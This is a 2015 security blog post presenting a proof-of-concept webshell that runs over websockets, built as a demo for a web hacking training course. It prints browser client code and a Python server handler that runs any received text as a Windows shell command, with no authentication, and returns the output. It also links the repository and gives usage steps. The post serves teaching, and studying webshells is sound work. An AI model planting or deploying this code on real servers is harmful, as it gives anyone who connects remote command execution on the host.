---
title: "Simple websockets based webshell"
date: 2015-02-18
categories:
- appsec
- websockets
tags:
- websocket
- shell
- xwh

thumbnailImagePosition: left
thumbnailImage: /img/simple-websockets-based-webshell/1.png
---

A simple client server Proof of Concept to show how websockets can be used to transfer and execute commands.

<!--more-->

## Introduction

I’m writing again after a year! It’s been an eventful one at that. Multiple conferences and two successful Xtreme Web Hacking trainings in that period.

As part of the XWH training that [Akash](https://akashm.com) and I did at nullcon 2015, I built an app to demo the functionality and usage of websockets. I went overboard and converted it into a full fledged web shell.

## Websocket Client

The client is a simple connect and send call to a websockets server:

```
function WebSocketShell()
{
    if ("WebSocket" in window)
    {
        var server = "serverip_or_hostname:9998/server"
        var ws = new WebSocket("ws://" + server);

        ws.onopen = function()
        {
            ws.send('ipconfig');
        };

        ws.onmessage = function (evt) 
        { 
            var received_msg = evt.data;
            alert(received_msg);
        };

        ws.onclose = function(a)
        { 
            alert('Error here');
        };
    }
    else
    {
        alert("WebSocket not supported by your Browser!");
    }
}
```

## Websocket Server

The websockets server is a [pywebsocket](https://github.com/google/pywebsocket) instance. The server side code is a python script that handles the incoming connection and the text.

The text is then passed to a `subprocess.Popen` call to be executed on the server. The output is collected and sent back to the client via the websocket.

```python
def web_socket_transfer_data(request):
 while True:
  line = request.ws_stream.receive_message()
  if line is None:
   return
  if isinstance(line, unicode):
   proc = subprocess.Popen('cmd.exe /c ' + line, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
   out = proc.stdout.read() + proc.stderr.read()
   request.ws_stream.send_message(out, binary=False)
  else:
   request.ws_stream.send_message('Send plain text only!', binary=True)
```

## Get it!

The code is available on [Github](https://github.com/riyazwalikar/websocketshell).

## Usage

To run the server on port 9998 (default in the code, can be changed):

1. Get [pywebsocket](https://github.com/google/pywebsocket)
2. Run `python pywebsocket\mod_pywebsocket\standalone.py -p 9998 -w ws_server`
3. Open `index.html` in any browser that supports websockets. Latest Chrome/Firefox is good enough.
4. Enter a (Windows) command like `ipconfig`
5. Hit the `Execute!` button.

Happy Hacking!

---